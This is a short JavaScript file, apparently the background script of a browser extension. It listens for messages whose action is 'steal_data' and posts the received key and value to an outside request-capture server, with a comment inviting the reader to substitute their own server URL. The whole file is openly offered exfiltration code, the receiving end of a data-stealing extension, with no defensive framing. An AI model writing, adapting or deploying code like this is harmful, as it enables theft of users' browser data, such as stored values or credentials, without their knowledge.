browser.runtime.onMessage.addListener((message) => {
    if (message.action === "steal_data") {
        fetch("https://vengadesh.free.beeceptor.com", { // Replace with your server URL
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ key: message.key, value: message.value })
        })
        .then((response) => console.log("Data sent successfully:", response.status))
        .catch((error) => console.error("Error sending data:", error));
    }
});
